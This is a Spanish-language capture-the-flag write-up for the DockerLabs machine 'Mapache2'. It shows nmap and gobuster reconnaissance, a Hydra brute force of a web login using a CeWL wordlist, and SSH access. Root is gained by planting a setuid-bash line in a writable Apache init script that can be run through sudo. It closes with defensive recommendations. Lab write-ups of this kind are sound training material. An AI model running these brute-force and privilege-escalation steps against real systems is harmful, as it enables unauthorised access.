# Mapache2 — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 29/08/2024  
**Técnicas:** Gobuster · Hydra · CeWL · SSH · Information Disclosure · Writable Init Script · sudo service abuse · SUID escalation

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Fuerza bruta con diccionario personalizado](#3-fuerza-bruta-con-diccionario-personalizado)
4. [Acceso SSH — usuario Kinder](#4-acceso-ssh--usuario-kinder)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh mapache2.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
3306/tcp open mysql
```

Servicios detectados:

```text
Hackerspace
MySQL
OpenSSH
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/login.php
/db.php
/index.html
```

Accedemos al panel de login:

```text
http://172.17.0.2/login.php
```

También encontramos una pista accediendo al puerto 3306 vía navegador:

```text
We have to change this, I told Medusa to protect this more.
```

La palabra **Medusa** parece relevante para posibles credenciales.

---

## 3. Fuerza bruta con diccionario personalizado

Probamos inicialmente con `rockyou.txt` sin éxito.

Generamos un diccionario personalizado utilizando CeWL:

```bash
cewl http://172.17.0.2 > passwords.txt
```

Realizamos fuerza bruta con Hydra:

```bash
hydra -l medusa -P passwords.txt \
172.17.0.2 http-post-form \
"/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

Resultado:

```text
login: medusa
password: enthusiasts
```

Accedemos al panel web.

Inspeccionando el código fuente encontramos una pista oculta:

```html
I hope my boss doesn't kill me, but I tell Kinder what a mess medusa made with the message from the port...
```

Obtenemos:

```text
Usuario: Kinder
Contraseña: medusa
```

---

## 4. Acceso SSH — usuario Kinder

Accedemos mediante SSH:

```bash
ssh Kinder@172.17.0.2
```

Contraseña:

```text
medusa
```

Acceso correcto.

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(ALL : ALL) NOPASSWD: /usr/sbin/service apache2 restart
```

---

## 5. Escalada de privilegios

Buscamos el servicio Apache:

```bash
find / -name apache2 2>/dev/null
```

Resultado relevante:

```text
/etc/init.d/apache2
```

Exploramos permisos:

```bash
cd /etc/init.d
ls -la
```

Observamos que el script `apache2` es modificable.

Editamos el fichero:

```bash
nano apache2
```

Añadimos:

```bash
#!/bin/sh

chmod u+s /bin/bash
```

Ejecutamos el servicio como root:

```bash
sudo /usr/sbin/service apache2 restart
```

Verificamos permisos:

```bash
ls -la /bin/bash
```

Resultado:

```text
-rwsr-xr-x
```

Ejecutamos Bash preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información sensible expuesta | Descubrimiento de usuarios |
| Contraseñas débiles | Acceso inicial |
| Uso de CeWL para OSINT | Generación de diccionarios efectivos |
| Script init modificable | Escalada de privilegios |
| sudo sobre service | Ejecución como root |

**Para defenderse:**

- Evitar exposición de pistas en aplicaciones web.
- Aplicar políticas robustas de contraseñas.
- Restringir permisos sobre scripts del sistema.
- Limitar comandos sudo peligrosos.
- Auditar servicios ejecutados con privilegios elevados.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
